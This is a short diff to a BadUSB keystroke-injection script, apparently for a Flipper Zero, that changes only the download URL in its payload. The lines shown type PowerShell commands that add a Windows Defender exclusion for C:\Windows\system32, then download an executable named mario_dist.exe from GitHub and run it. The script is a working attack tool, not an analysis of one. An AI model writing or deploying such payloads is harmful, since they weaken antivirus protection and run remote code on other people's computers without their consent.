@@ -20,5 +20,5 @@ DELAY 2000
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
 DELAY 2000
-STRING $down=New-Object System.Net.WebClient;$url='https://github.com/bemxio/mario-head/releases/latest/download/mario_dist.exe';$file='mario_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/nullze/Flipper-Zero-BadKB-Files/raw/main/Windows/Pranks/Files/mario_dist.exe';$file='mario_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
